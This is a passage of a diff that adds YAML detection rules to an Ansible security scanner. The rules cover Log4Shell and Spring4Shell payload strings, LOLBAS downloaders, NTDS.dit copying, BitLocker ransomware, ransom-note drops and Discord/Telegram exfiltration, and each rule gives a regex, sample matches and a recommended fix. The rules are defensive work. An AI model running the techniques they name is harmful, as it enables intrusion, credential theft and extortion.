+    regex: "(?:cat.*>.*LaunchDaemons.*\\.plist|schtasks.*/create.*/tr.*\\{\\{.*\\}\\})"
+    positive_examples:
+      - "cat>LaunchDaemons.plist"
+    recommendation: "Writing LaunchDaemons plist files / schtasks /create are persistence techniques (MITRE T1547); remove the task, enumerate existing persistence on every affected host (osquery, autoruns), and provision legitimate services via ansible.builtin.systemd_service / community.windows.win_scheduled_task with static configuration."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "database_backdoor_user_creation"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Database Backdoor User Creation"
+    description: "Creating database users with hardcoded passwords and excessive privileges"
+    regex: "(?:CREATE USER|createuser).*(?:WITH PASSWORD|IDENTIFIED BY|--pwprompt).*['\"][^'\"]{6,}['\"].*(?:CREATEDB|SUPERUSER|CREATEROLE|REPLICATION|ALL PRIVILEGES)"
+    positive_examples:
+      - "CREATE USERWITH PASSWORD'xxxxxx'CREATEDB"
+    recommendation: "CREATE USER ... WITH PASSWORD '...' SUPERUSER / ALL PRIVILEGES creates a privileged backdoor account; remove it, audit the database for unauthorised logins, and provision real users via the database module (community.postgresql.postgresql_user, community.mysql.mysql_user) with role-based scoped grants and credentials in Vault."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "database_privilege_escalation"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Database Privilege Escalation"
+    description: "Granting excessive database privileges that could enable backdoor access"
+    regex: "GRANT\\s+(?:ALL\\s+PRIVILEGES|SUPERUSER|CREATE|ALTER|DROP).*TO\\s+[a-zA-Z_][a-zA-Z0-9_]*"
+    positive_examples:
+      - "- name: Grant CREATEDB privilege to database user for force_drop_db"
+    recommendation: "GRANT ALL PRIVILEGES / SUPERUSER / CREATE / ALTER / DROP grants standing administrative access; replace with the minimum role the workload requires (e.g. SELECT/INSERT on named tables) via community.postgresql.postgresql_privs / community.mysql.mysql_user and review the grant in code review."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "hardcoded_database_password"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Hardcoded Database Password"
+    description: >-
+        psql/mysql/sqlcmd/sqlite3/mongo command-line carries WITH PASSWORD,
+        IDENTIFIED BY, --password=, or -p with a 6+ char literal. The shape leaks
+        the DB credential to argv and shell history.
+    regex: "(?:psql|mysql|sqlcmd|sqlite3|mongo).*(?:(?:WITH PASSWORD|IDENTIFIED BY)[\\s=]|--password=|-p)['\"][^'\"]{6,}['\"]"
+    positive_examples:
+      - "psql -U postgres -c \\\"ALTER USER \\\\\\\"{{ awx_postgres_user }}\\\\\\\" WITH PASSWORD '{{ awx_postgres_pass }}';\\\""
+    recommendation: "Database CLIs with --password=... / -p'...' on argv leak credentials via /proc and shell history; switch to env (PGPASSWORD), .my.cnf [client] (mode 0600), or community.{mysql,postgresql,mongodb} modules with login_password: loaded from Ansible Vault."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "suspicious_database_maintenance"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Suspicious Database Maintenance"
+    description: "Database operations hidden in maintenance scripts with output suppression"
+    regex: "(?:psql|mysql|sqlcmd|sqlite3|mongo).*(?:CREATE\\s+USER|GRANT|ALTER\\s+USER|DROP\\s+USER).*(?:>/dev/null|2>&1|\\|\\|\\s*true)"
+    positive_examples:
+      - "psqlCREATE USER>/dev/null"
+    recommendation: "CREATE USER / GRANT / ALTER USER / DROP USER paired with >/dev/null 2>&1 / || true masks failures of credential-altering DDL; treat the task as malicious, remove it, and audit the database's authentication log for unauthorised changes."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "hidden_command_execution"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Hidden Command Execution"
+    description: "Commands with output suppression that could hide malicious activity"
+    regex: "(?:curl|wget|psql|mysql|ssh|bash|sh).*(?:CREATE|GRANT|chmod|chown|useradd|usermod).*(?:>/dev/null\\s*2>&1|2>/dev/null|\\|\\|\\s*true)"
+    positive_examples:
+      - "curlCREATE>/dev/null2>&1"
+    recommendation: "Combining CREATE / GRANT / chmod / chown / useradd / usermod with output suppression (>/dev/null 2>&1, || true) hides whether the change actually applied; let stdout/stderr surface to Ansible (the runner already captures them) and rely on changed_when: / failed_when: for control flow."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  # -- 2024-2026 named-CVE exploitation patterns -----------------------------
+  - id: "log4shell_exploitation_payload"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Log4Shell (CVE-2021-44228) Exploitation Payload in Playbook"
+    description: "A task embeds a JNDI lookup string - `${jndi:ldap://...}`, `${jndi:rmi://...}`, `${jndi:dns://...}`, or an obfuscated `${${lower:j}ndi:...}` / `${::-j}${::-n}${::-d}${::-i}:` form - into a header, URL parameter, template, or shell command. This is the Log4Shell exploitation vector against any unpatched Log4j 2.x <= 2.14.1 (CVE-2021-44228) or <= 2.15.0 (CVE-2021-45046). A playbook that ships this payload is either actively exploiting vulnerable targets or preserving a pen-test payload that must not land in production."
+    regex: "\\$\\{(?:jndi|(?:[^}{]*\\$\\{[^}]*\\})*[^}]*(?:jndi|JNDI|\\$\\{[:a-zA-Z_-]*[jJ][:a-zA-Z_-]*\\}))[^}]{0,300}(?:ldap|rmi|dns|corba|iiop|nis|nds|ldaps)"
+    positive_examples:
+      - "${jndildap"
+    multiline: false
+    recommendation: "Remove the payload. Targets must be patched to Log4j >= 2.17.1 (or >= 2.12.4 for Java 7, >= 2.3.2 for Java 6). Short-term mitigation on legacy targets: set `-Dlog4j2.formatMsgNoLookups=true` and remove the `JndiLookup` class (`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`). Detection: EDR/WAF/SIEM rule on the regex above across inbound HTTP headers and URL parameters."
+    no_ansible_remediation: true
+    nist_controls: ['RA-5', 'SI-2', 'SI-3', 'SI-4']
+    pci_dss: ['6.3.3', '11.3.1']
+    soc2: ['CC7.1', 'CC7.3']
+    mitre_attack: ['T1059', 'T1190']
+    cwe: ['CWE-20', 'CWE-74', 'CWE-502']
+    cve: ["CVE-2021-44228", "CVE-2021-45046"]
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.2.1"]
+    references:
+      - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+
+  - id: "spring4shell_exploitation_payload"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Spring4Shell (CVE-2022-22965) Exploitation Payload in Playbook"
+    description: "A task embeds the Spring4Shell exploitation primitive - `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...`, `class.module.classLoader.resources.context.parent.pipeline.first.suffix=...`, or the AccessLogValve-based JSP webshell write (`pattern=%{c2}i`, `suffix=.jsp`, `directory=webapps/ROOT`). This is active exploitation of Spring Framework < 5.2.20 / < 5.3.18 on Tomcat with JDK >= 9 (CVE-2022-22965)."
+    regex: "class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.(?:pattern|suffix|prefix|directory|fileDateFormat)\\s*="
+    positive_examples:
+      - "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+    multiline: false
+    recommendation: "Remove the payload. Patch Spring Framework to >= 5.3.18 or >= 5.2.20; on JDK <= 8 the vulnerability is not exploitable. If you cannot patch immediately, set a `WebDataBinder.setDisallowedFields` global configuration blocking `class.*`, `Class.*`, `*.class.*`, `*.Class.*`. Detection: WAF rule on the regex above; hunt for unexpected `.jsp` writes under `webapps/ROOT/`."
+    no_ansible_remediation: true
+    nist_controls: ['RA-5', 'SI-2', 'SI-3', 'SI-4']
+    pci_dss: ['6.3.3', '11.3.1']
+    soc2: ['CC7.1', 'CC7.3']
+    mitre_attack: ['T1190', 'T1505.003']
+    cwe: ['CWE-20', 'CWE-94']
+    cve: ["CVE-2022-22965"]
+    owasp_appsec: ["A03:2021"]
+    references:
+      - "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+
+  - id: "ssrf_to_cloud_metadata_service"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "SSRF to Cloud Instance Metadata Service From Ansible URI Module"
+    description: "An `ansible.builtin.uri`, `ansible.builtin.get_url`, `community.general.uri`, or raw `curl`/`wget` task targets a cloud instance-metadata endpoint: `169.254.169.254` (AWS / GCP / Azure / Oracle IMDS), `fd00:ec2::254` (AWS IPv6 IMDS), `metadata.google.internal`, or `metadata.azure.com`. A playbook that pulls IMDS data and exfiltrates or templates it elsewhere is the canonical SSRF-to-credential-theft primitive (Capital One, Drupalgeddon successor campaigns) - and inside cloud CI runners where the playbook is attacker-influenced, IMDSv1 responses include the instance-profile's temporary credentials."
+    regex: "(?:ansible\\.builtin\\.(?:uri|get_url)|community\\.general\\.uri|curl\\b|wget\\b)[\\s\\S]{0,400}?(?:(?:url|src|uri)\\s*:\\s*[\"']?(?:https?://)?(?:169\\.254\\.169\\.254|\\[?fd00:ec2::254\\]?|metadata\\.google\\.internal|metadata\\.azure\\.com|metadata\\.packet\\.net|100\\.100\\.100\\.200)|\\b(?:169\\.254\\.169\\.254|metadata\\.google\\.internal|metadata\\.azure\\.com)\\b)"
+    positive_examples:
+      - "ansible.builtin.uriurl:169.254.169.254"
+    multiline: true
+    window: 6
+    recommendation: "IMDS access from a playbook is legitimate only when the playbook runs **on the instance itself** for bootstrapping/tagging, and only via IMDSv2 (AWS: `PUT` to `/latest/api/token` then `X-aws-ec2-metadata-token` header). Never template IMDS response bodies into other `uri` tasks, logs, or files readable by CI - any of those become credential exfiltration. Enforce IMDSv2 at the instance level (`HttpTokens: required`, `HttpPutResponseHopLimit: 1`). In CI, block 169.254.169.254 with a per-job network policy or egress firewall."
+    no_ansible_remediation: true
+    nist_controls: ['AC-3', 'SC-7', 'SI-4', 'SI-10']
+    pci_dss: ['1.2.1', '6.2.4', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)']
+    soc2: ['CC6.1', 'CC6.6', 'CC7.1']
+    mitre_attack: ['T1078.004', 'T1528', 'T1552.005']
+    cwe: ['CWE-522', 'CWE-918']
+    owasp_appsec: ["A04:2021", "A10:2021"]
+    owasp_asvs: ["V2.10.1", "V6.2.1"]
+
+  # -- CVE-era exploitation detections (2024-2026) --------------------------
+  - id: "log4shell_mitigation_disabled"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Log4Shell (CVE-2021-44228) Mitigation Disabled"
+    description: "Sets log4j2.formatMsgNoLookups=false or removes the JndiLookup class removal, re-opening Log4Shell exploitation"
+    regex: "(?i)log4j2\\.formatMsgNoLookups\\s*=\\s*false|-Dlog4j2\\.formatMsgNoLookups=false|LOG4J_FORMAT_MSG_NO_LOOKUPS\\s*[:=]\\s*(?:false|0)"
+    positive_examples:
+      - "log4j2.formatMsgNoLookups=false"
+    recommendation: "Upgrade log4j to 2.17.1+ and keep formatMsgNoLookups=true; do not downgrade; audit JAVA_TOOL_OPTIONS for overrides"
+    no_ansible_remediation: true
+    cwe: ['CWE-20', 'CWE-917']
+    cve: ["CVE-2021-44228"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1190']
+    cis_controls: ['CIS-7.1']
+
+  - id: "spring4shell_vulnerable_config"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Spring4Shell (CVE-2022-22965) Vulnerable DataBinder"
+    description: "Deploys Spring Framework before 5.3.18 / 5.2.20 without disallowedFields protection, exposing the DataBinder RCE"
+    regex: "(?i)spring-(?:beans|core|web)-5\\.[0-2]\\.\\d+\\.jar|spring-(?:boot|framework)\\s*[=:]\\s*[\"']?(?:2\\.[0-6]\\.\\d+|5\\.[0-2]\\.\\d+)"
+    positive_examples:
+      - "spring-beans-5.0.0.jar"
+    recommendation: "Upgrade Spring Framework to 5.3.18+ / 5.2.20+ (Spring Boot 2.6.6+ / 2.5.12+); add `disallowedFields` to every `@InitBinder`"
+    no_ansible_remediation: true
+    cwe: ['CWE-20', 'CWE-917']
+    cve: ["CVE-2022-22965"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1190']
+    cis_controls: ['CIS-7.1']
+
+  - id: "confluence_unauthenticated_admin_creation_indicator"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Confluence Broken Access Control (CVE-2023-22515) Indicator"
+    description: "Creates a Confluence administrator account via the unauthenticated setup endpoint, the signature of CVE-2023-22515 post-exploitation"
+    regex: "(?i)/setup/setupadministrator\\.action|/setup/finishsetup\\.action|confluence.*uri.*method=POST.*applicationConfig"
+    positive_examples:
+      - "/setup/setupadministrator.action"
+    recommendation: "Patch Confluence DC/Server to 8.3.3+, 8.4.3+, 8.5.2+; block public access to /setup/*; audit `confluence_admin_users` for unknown accounts"
+    no_ansible_remediation: true
+    cwe: ['CWE-20', 'CWE-863']
+    cve: ["CVE-2023-22515"]
+    owasp_appsec: ["A01:2021", "A03:2021"]
+    mitre_attack: ['T1136.001', 'T1190']
+    cis_controls: ['CIS-5.1']
+
+  - id: "moveit_sqli_webshell_write"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "MOVEit-Style Webshell Drop (CVE-2023-34362 Signature)"
+    description: "Writes a human2.aspx / human2.php webshell or drops a LEMURLOOT-style ASPX handler, the signature used in the Cl0p MOVEit campaign"
+    regex: "(?i)(?:human2|human)\\.(?:aspx|php)|LEMURLOOT|MoveITTransfer.*asmx.*Session|[/\\\\]wwwroot[/\\\\].*\\.aspx.*dest"
+    positive_examples:
+      - "human2.aspx"
+    recommendation: "Remove the dropped file; hunt for further Cl0p indicators; patch MOVEit Transfer to June 2023+ builds; rotate all app-service credentials"
+    no_ansible_remediation: true
+    cwe: ['CWE-89', 'CWE-434']
+    cve: ["CVE-2023-34362"]
+    owasp_appsec: ["A03:2021", "A04:2021"]
+    owasp_asvs: ["V12.2.1", "V12.4.1"]
+    mitre_attack: ['T1190', 'T1505.003']
+    cis_controls: ['CIS-7.1']
+
+  # -- Windows LOLBAS (Living-Off-The-Land) post-exploitation (2025-2026) ---
+  - id: "lolbas_certutil_url_download"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "certutil.exe Used To Download Remote Payload (LOLBAS)"
+    description: "A Windows task invokes `certutil.exe -urlcache -split -f http://... <dest>` or `certutil -decode <b64file> <exe>` - the canonical LOLBAS primitive for fetching or decoding second-stage payloads while masquerading as a PKI tool. certutil is signed by Microsoft, runs with any-user context, and is not blocked by the default Windows Defender Attack Surface Reduction baseline - which is exactly why every commodity loader (Qakbot, Emotet, Black Basta) uses it."
+    regex: "certutil(?:\\.exe)?\\s+(?:-urlcache|-verifyctl|-split)\\s+[^\\n]{0,300}https?://|certutil(?:\\.exe)?\\s+-decode\\s+[^\\n]{0,200}\\.(?:exe|dll|ps1|bat)"
+    positive_examples:
+      - "certutil -urlcache http://"
+    recommendation: "Remove the task. If you genuinely need to fetch a signed binary on Windows, use `ansible.windows.win_get_url` with `checksum:` set, or `Invoke-WebRequest -UseBasicParsing` with certificate pinning. Block certutil download behaviour at policy layer via the ASR rule `Block executable content from email client and webmail` (GUID BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550) and the `BlockOfficeCommunicationAppFromCreatingChildProcesses` equivalents. Monitor with Sysmon Event ID 1 + 3 for `certutil.exe` with a URL in the command line."
+    no_ansible_remediation: true
+    cwe: ['CWE-494', 'CWE-829']
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: ["V10.3.1", "V10.3.2"]
+    mitre_attack: ['T1105', 'T1140', 'T1218']
+    cis_controls: ['CIS-4.8', 'CIS-10.5']
+    nist_controls: ['CM-7', 'SI-3', 'SI-4']
+    pci_dss: ['1.2.1', '6.3.3']
+    soc2: ['CC7.1', 'CC7.2']
+
+  - id: "lolbas_bitsadmin_transfer"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "bitsadmin.exe /transfer Used To Download Remote Payload (LOLBAS)"
+    description: "A Windows task invokes `bitsadmin /transfer <jobname> /download /priority <n> http://... <dest>`. BITS (Background Intelligent Transfer Service) was designed for Windows Update but the LOLBAS pattern `bitsadmin /transfer` downloads arbitrary files while appearing as a benign OS service, bypassing many network-activity heuristics because the traffic originates from `svchost.exe` hosting BITS rather than the caller."
+    regex: "bitsadmin(?:\\.exe)?\\s+/transfer\\s+[^\\n]{0,300}(?:/download\\s+)?(?:/priority\\s+\\w+\\s+)?https?://"
+    positive_examples:
+      - "bitsadmin /transfer http://"
+    recommendation: "Remove the task. Prefer `ansible.windows.win_get_url` with a checksum. For fleet-wide mitigation, restrict BITS-initiated network I/O to `*.microsoft.com` / `*.windowsupdate.com` via the Windows Firewall service-based rule, and monitor with Sysmon Event ID 1 on `bitsadmin.exe` + Event ID 22 (DNS query) from `svchost.exe` hosting BITS to non-Microsoft hosts."
+    no_ansible_remediation: true
+    cwe: ['CWE-494', 'CWE-829']
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: ["V10.3.1", "V10.3.2"]
+    mitre_attack: ['T1105', 'T1197', 'T1218']
+    cis_controls: ['CIS-4.8', 'CIS-10.5']
+    nist_controls: ['CM-7', 'SI-4']
+    pci_dss: ['6.3.3']
+    soc2: ['CC7.1', 'CC7.2']
+
+  - id: "lolbas_mshta_remote_hta"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "mshta.exe Executes Remote HTA / vbscript URL (LOLBAS)"
+    description: "A task runs `mshta.exe http(s)://...` or `mshta.exe vbscript:...`. mshta runs HTML Applications with full user privilege and no warning dialog, and is the dominant delivery vehicle for JScript / VBScript loaders in phishing campaigns (Qakbot, IcedID, SocGholish). The `vbscript:` scheme embeds the entire payload inline without touching disk."
+    regex: "mshta(?:\\.exe)?\\s+(?:https?://|vbscript:|javascript:)"
+    positive_examples:
+      - "mshta http://"
+    recommendation: "Remove the task. Block mshta entirely via ASR rule `Block all Office applications from creating child processes` and `Block Win32 API calls from Office macros`. If mshta is truly required (uncommon), use a signed, pinned local .hta and enforce AppLocker path + publisher rules."
+    no_ansible_remediation: true
+    cwe: ['CWE-749', 'CWE-829']
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: ["V10.3.1"]
+    mitre_attack: ['T1218.005']
+    cis_controls: ['CIS-2.7', 'CIS-10.5']
+    nist_controls: ['CM-7', 'SI-3', 'SI-4']
+    pci_dss: ['6.3.3']
+    soc2: ['CC7.1']
+
+  - id: "lolbas_regsvr32_scrobj_squiblydoo"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "regsvr32.exe Used With scrobj.dll (Squiblydoo AppLocker Bypass)"
+    description: "A task invokes `regsvr32.exe /s /u /n /i:http(s)://... scrobj.dll` - the Squiblydoo AppLocker-bypass primitive. scrobj.dll (Windows Script Host) executes the remote .sct file's JScript/VBScript content in the context of the running user, bypassing AppLocker path/publisher rules because regsvr32 is a Microsoft-signed binary in a default-allowed location."
+    regex: "regsvr32(?:\\.exe)?\\s+[^\\n]{0,200}(?:/i:https?://|scrobj\\.dll)"
+    positive_examples:
+      - "regsvr32 /i:http://"
+    recommendation: "Remove the task. Disable scrobj.dll-based script-host behaviour with AppLocker's `Packaged app rules` + the explicit DLL rule denying scrobj.dll / scrrun.dll loads from user-writable paths. Complement with ASR rule `Block execution of potentially obfuscated scripts` (GUID 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC)."
+    no_ansible_remediation: true
+    cwe: ['CWE-749', 'CWE-829']
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: ["V10.3.1"]
+    mitre_attack: ['T1218.010']
+    cis_controls: ['CIS-2.7', 'CIS-10.5']
+    nist_controls: ['CM-7', 'SI-3', 'SI-4']
+    pci_dss: ['6.3.3']
+    soc2: ['CC7.1']
+
+  - id: "lolbas_esentutl_vss_ntds_copy"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "esentutl.exe Used To Copy NTDS.dit or SYSTEM Hive Via VSS (LOLBAS)"
+    description: "A task invokes `esentutl.exe /y /vss C:\\\\Windows\\\\NTDS\\\\ntds.dit` or `/vss C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM`. esentutl's `/y` copy flag combined with `/vss` (Volume Shadow Copy) pulls a consistent copy of locked files - the preferred technique for offline NTDS.dit extraction after domain-admin compromise, because it avoids `ntdsutil.exe ifm create` which drops obvious audit events. With NTDS.dit + SYSTEM hive an attacker has every AD credential hash."
+    regex: "esentutl(?:\\.exe)?\\s+/y\\s+[^\\n]{0,200}(?:/vss|ntds\\.dit|\\\\config\\\\SYSTEM)"
+    positive_examples:
+      - "esentutl /y /vss"
+    recommendation: "Remove the task. Legitimate NTDS backup uses `wbadmin start systemstatebackup` on a DC with a dedicated backup account, not ad-hoc esentutl from Ansible. Detect at SACL layer: audit object access on `C:\\Windows\\NTDS\\` and `C:\\Windows\\System32\\config\\SYSTEM`, and alert on any non-SYSTEM user reading them."
+    no_ansible_remediation: true
+    cwe: ['CWE-200', 'CWE-732']
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V8.1.1", "V12.4.1"]
+    mitre_attack: ['T1003.003', 'T1218']
+    cis_controls: ['CIS-3.11', 'CIS-8.11']
+    nist_controls: ['AC-6', 'AU-2', 'AU-12', 'SI-4']
+    pci_dss: ['7.2.1', '8.6.2']
+    hipaa: ['164.312(a)(1)', '164.312(b)']
+    soc2: ['CC6.1', 'CC7.2']
+
+  - id: "bitlocker_force_encrypt_ransomware_primitive"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "BitLocker Force-Enabled From Automation With Attacker-Controlled Recovery Key"
+    description: "A task invokes `manage-bde -on <drive> -recoverypassword <password>` or `Enable-BitLocker -MountPoint <drive> -RecoveryPasswordProtector` from an ad-hoc Ansible playbook (not a signed corporate MDM / GPO baseline). This is the exact primitive used by LockBit-4, BlackCat/ALPHV, and NoEscape 2024-2025 campaigns: the attacker turns the victim's own native BitLocker into a ransomware crypter, then withholds the recovery password. Legitimate BitLocker rollout always escrows the recovery key in AD / Intune / Azure AD - never in an inline playbook variable."
+    regex: "(?:manage-bde(?:\\.exe)?\\s+-on\\s+|Enable-BitLocker\\s+-MountPoint\\s+)[^\\n]{0,300}-(?:recoverypassword|RecoveryPasswordProtector)\\b"
+    positive_examples:
+      - "manage-bde -on -recoverypassword"
+    recommendation: "Never enable BitLocker from an ad-hoc playbook. Deploy via Intune BitLocker policy / AD GPO with `Choose how BitLocker-protected operating system drives can be recovered: Save BitLocker recovery information to AD DS: Required`. Monitor `Microsoft-Windows-BitLocker/BitLocker Management` Event IDs 768/769 (key rotation) and alert on any BitLocker enablement that is not correlated to a Group Policy cycle."
+    no_ansible_remediation: true
+    cwe: ['CWE-311', 'CWE-319']
+    owasp_appsec: ["A02:2021", "A04:2021"]
+    owasp_asvs: ["V8.3.1", "V9.1.1", "V9.2.1"]
+    mitre_attack: ['T1486', 'T1490']
+    cis_controls: ['CIS-3.6', 'CIS-3.11']
+    nist_controls: ['CP-9', 'CP-10', 'SC-12', 'SC-28']
+    pci_dss: ['3.5.1', '12.10.1']
+    hipaa: ['164.312(a)(2)(iv)', '164.312(c)(1)']
+    soc2: ['A1.2', 'CC6.1']
+
+  - id: "ransomware_note_drop_pattern"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Ransomware Note File Dropped To Multiple User Directories"
+    description: "A task templates or copies a file whose name matches the canonical ransomware-note shape (`HOW_TO_DECRYPT*.txt`, `DECRYPT_INSTRUCTIONS*.txt`, `RESTORE-MY-FILES.txt`, `README_FOR_DECRYPT*.txt`, `_readme.txt` with decrypt keyword in content) into `C:\\Users\\*`, `/home/*`, or `/root`. There is essentially no legitimate reason for a configuration playbook to drop such a filename - it is either a training exercise (should live outside production inventories) or an active extortion payload."
+    regex: "(?:ansible\\.(?:builtin|windows)\\.(?:copy|template|win_copy)|win_shortcut)\\s*:[\\s\\S]{0,300}?(?:dest|path)\\s*:\\s*['\"]?[^'\"\\n]*(?:HOW[_-]?TO[_-]?DECRYPT|DECRYPT[_-]?INSTRUCTIONS|RESTORE[_-]?(?:MY[_-]?)?FILES|README[_-]?FOR[_-]?DECRYPT|_readme\\.txt)"
+    positive_examples:
+      - "ansible.builtin.copy:dest:HOWTODECRYPT"
+    multiline: true
+    window: 20
+    recommendation: "Remove the task immediately and treat the host inventory as compromised. Search for and remove any dropped notes across the fleet (`find /home /root -maxdepth 3 -type f \\( -iname 'HOW_TO_DECRYPT*' -o -iname 'README_FOR_DECRYPT*' -o -iname '_readme.txt' \\)`). Rotate all credentials reachable from the affected hosts. Initiate incident-response (preserve VSS snapshots before the attacker deletes them)."
+    no_ansible_remediation: true
+    cwe: ['CWE-506']
+    mitre_attack: ['T1486', 'T1491']
+    cis_controls: ['CIS-10.1', 'CIS-17.3']
+    nist_controls: ['CP-9', 'IR-4', 'IR-6', 'SI-4']
+    pci_dss: ['12.10.1', '12.10.3']
+    hipaa: ['164.308(a)(6)(ii)']
+    soc2: ['CC7.3', 'CC7.4']
+
+  # Generic fallback pattern - must be last!
+  - id: "generic_template_injection"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Generic Template Variable Injection"
+    description: "Using dangerous template variables that could allow command injection"
+    regex: "\\{\\{\\s*(?:command_input|user_command|requested_action)\\s*\\}\\}"
+    positive_examples:
+      - "{{command_input}}"
+    recommendation: "{{ command_input }} / {{ user_command }} / {{ requested_action }} are attacker-controlled by name; do not pass them to a shell. Validate the value against an explicit allow-list with ansible.builtin.assert and dispatch to a named module call (when: action == 'restart_nginx' -> ansible.builtin.systemd_service)."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "discord_telegram_pastebin_c2_beacon"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Task POSTs To Discord / Telegram / Pastebin As Live C2 Or Exfil Channel"
+    description: "A task invokes `uri`, `ansible.builtin.uri`, `community.general.slack` misused, `curl -X POST`, or a Jinja-templated HTTP call against a Discord webhook (`discord.com/api/webhooks/<id>/<token>`), a Telegram bot API (`api.telegram.org/bot<token>/sendMessage|sendDocument`), Pastebin paste API (`pastebin.com/api/api_post.php`), Hastebin / dpaste / ix.io, or a Keybase chat API. These endpoints are the 2024 default C2 / exfil channels for commodity loaders (AgentTesla, RedLine, Vidar, Lumma, Meduza Stealer) because they blend with legitimate SaaS traffic, TLS-encrypt automatically, and require no infrastructure on the attacker side. Legitimate automation essentially never POSTs to them."
+    regex: "(?:ansible\\.builtin\\.uri|community\\.general\\.slack|shell|command|raw)[\\s\\S]{0,500}?(?:url|uri|endpoint|dest)\\s*[:=]\\s*['\"]?https?://(?:discord(?:app)?\\.com/api/webhooks/|api\\.telegram\\.org/bot[^/\\s]+/(?:sendMessage|sendDocument|sendPhoto)|pastebin\\.com/api/api_post\\.php|hastebin\\.com/documents|dpaste\\.com/api|ix\\.io/?|keybase\\.io/_/api)"
+    positive_examples:
+      - "ansible.builtin.uriurl:http://discord.com/api/webhooks/"
+    multiline: true
+    window: 10
+    recommendation: "Remove the task immediately and treat the host as compromised - no production automation legitimately needs to POST to Discord / Telegram / Pastebin. Rotate credentials reachable from the host, pull network flow logs for any POST to the listed endpoints in the past 30 days, and hunt for the webhook/bot token's usage history via Discord's audit-log API or Telegram's `getMe`. Block the listed domains at the egress firewall (`discord.com`, `api.telegram.org`, `pastebin.com`) outside of narrowly-scoped ChatOps use-cases, which should use an authenticated enterprise broker (Mattermost, Slack Enterprise Grid) instead."
+    no_ansible_remediation: true
+    cwe: ['CWE-506', 'CWE-912']
+    mitre_attack: ['T1041', 'T1102.001', 'T1567.002']
+    cis_controls: ['CIS-3.3', 'CIS-4.8', 'CIS-13.7']
+    nist_controls: ['AC-4', 'CM-7', 'SC-7', 'SI-4']
+    pci_dss: ['1.2.1', '12.10.1']
+    hipaa: ['164.312(e)(1)']
+    soc2: ['CC6.6', 'CC7.2']
+
+  - id: "wdac_applocker_policy_merged_allow_all"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "WDAC / AppLocker Policy Merged With Allow-All Rule Or Set To Audit-Only From Playbook"
+    description: "A task runs `Set-AppLockerPolicy -Merge`, `Set-CIPolicy`, `ConvertFrom-CIPolicy`, or templates a WDAC `.cip`/`.xml` that contains a `FileRule.Level=\"Hash\"` with wildcard `Hash=\"*\"`, OR toggles the policy mode to `Audit` (enforcement-off) via `Set-RuleOption -Option 3`. WDAC (Windows Defender Application Control) and AppLocker are the Microsoft-recommended application-allowlisting controls for servers and privileged workstations. Merging an allow-all policy, or flipping to Audit-only, is the textbook EDR-bypass setup used by Scattered Spider and BlackCat/ALPHV affiliates in 2024-2025 ransomware intrusions before deploying unsigned ransomware payloads."
